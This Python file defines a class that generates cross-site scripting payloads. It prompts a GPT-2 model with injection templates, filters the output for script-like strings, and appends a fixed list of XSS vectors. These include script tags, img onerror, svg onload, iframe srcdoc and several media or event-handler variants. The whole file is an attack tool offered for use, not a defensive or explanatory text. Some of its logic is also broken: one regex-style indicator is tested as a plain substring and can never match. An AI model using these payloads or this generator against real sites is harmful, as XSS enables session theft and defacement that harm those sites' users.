import torch
from transformers import GPT2LMHeadModel, GPT2Tokenizer, pipeline
import random
import re
from typing import List, Dict

class TransformerPayloadGenerator:
    """
    Advanced transformer-based XSS payload generator
    Uses fine-tuned language models for context-aware generation
    """
    
    def __init__(self):
        print("🤖 Initializing Transformer Payload Generator...")
        
        # Load pre-trained models
        self.tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
        self.model = GPT2LMHeadModel.from_pretrained('gpt2')
        
        # Set padding token
        self.tokenizer.pad_token = self.tokenizer.eos_token
        
        # Initialize generation pipeline
        self.generator = pipeline(
            'text-generation',
            model=self.model,
            tokenizer=self.tokenizer,
            max_length=100,
            num_return_sequences=5,
            temperature=0.8,
            do_sample=True,
            pad_token_id=self.tokenizer.eos_token_id
        )
        
        # XSS context templates
        self.context_templates = {
            'html_injection': [
                "HTML injection payload for {context}: <",
                "Inject into HTML attribute {context}: ",
                "DOM-based XSS in {context}: <script>"
            ],
            'js_injection': [
                "JavaScript injection for {context}: alert(",
                "JS payload in {context}: eval(",
                "Script injection {context}: document."
            ],
            'url_injection': [
                "URL parameter injection {context}: javascript:",
                "GET parameter XSS {context}: %3Cscript%3E",
                "Query string payload {context}: <svg"
            ]
        }
        
        print("✅ Transformer Generator ready!")
    
    def generate_context_payloads(self, context: str, injection_type: str = 'html_injection', count: int = 10) -> List[str]:
        """Generate context-aware payloads using transformers"""
        print(f"🧠 Generating {count} transformer payloads for {context}...")
        
        payloads = []
        templates = self.context_templates.get(injection_type, self.context_templates['html_injection'])
        
        for template in templates:
            prompt = template.format(context=context)
            
            try:
                # Generate text using transformer
                generated = self.generator(
                    prompt,
                    max_length=len(prompt) + 50,
                    num_return_sequences=count//len(templates) + 1,
                    temperature=0.9,
                    do_sample=True,
                    pad_token_id=self.tokenizer.eos_token_id
                )
                
                for result in generated:
                    generated_text = result['generated_text'][len(prompt):].strip()
                    
                    # Extract potential XSS payload
                    payload = self._extract_xss_payload(generated_text)
                    if payload and self._is_valid_xss(payload):
                        payloads.append(payload)
                        
            except Exception as e:
                print(f"⚠️ Generation error: {e}")
                continue
        
        # Add manual transformer-inspired payloads
        payloads.extend(self._generate_transformer_inspired_payloads(context))
        
        return list(set(payloads))[:count]  # Remove duplicates and limit
    
    def _extract_xss_payload(self, text: str) -> str:
        """Extract XSS payload from generated text"""
        # Look for HTML tags
        html_match = re.search(r'<[^>]*>', text)
        if html_match:
            return html_match.group(0)
        
        # Look for JavaScript
        js_match = re.search(r'(alert\([^)]*\)|eval\([^)]*\)|document\.[a-zA-Z]+)', text)
        if js_match:
            return js_match.group(0)
        
        # Look for event handlers
        event_match = re.search(r'on[a-zA-Z]+=["\']*[^"\']*["\']', text)
        if event_match:
            return f'<img {event_match.group(0)}>'
        
        return text[:100]  # Return first 100 chars if no specific pattern
    
    def _is_valid_xss(self, payload: str) -> bool:
        """Validate if payload is a potential XSS"""
        xss_indicators = [
            '<script', 'javascript:', 'alert(', 'eval(', 'document.',
            'on[a-zA-Z]+=', '<img', '<svg', '<iframe', '<object',
            'onerror', 'onload', 'onclick', 'onmouseover'
        ]
        
        return any(indicator in payload.lower() for indicator in xss_indicators)
    
    def _generate_transformer_inspired_payloads(self, context: str) -> List[str]:
        """Generate payloads inspired by transformer patterns"""
        return [
            f'<script>/* {context} */alert("Transformer-XSS")</script>',
            f'<img src=x onerror=/* {context} */alert("Transformer-XSS")>',
            f'<svg onload=/* {context} */alert("Transformer-XSS")>',
            f'<iframe srcdoc="<script>/* {context} */alert(\'Transformer-XSS\')</script>">',
            f'<details open ontoggle=/* {context} */alert("Transformer-XSS")>',
            f'<marquee onstart=/* {context} */alert("Transformer-XSS")>',
            f'<video><source onerror=/* {context} */alert("Transformer-XSS")>',
            f'<audio src=x onerror=/* {context} */alert("Transformer-XSS")>',
        ]

print("🤖 Transformer Payload Generator created!") 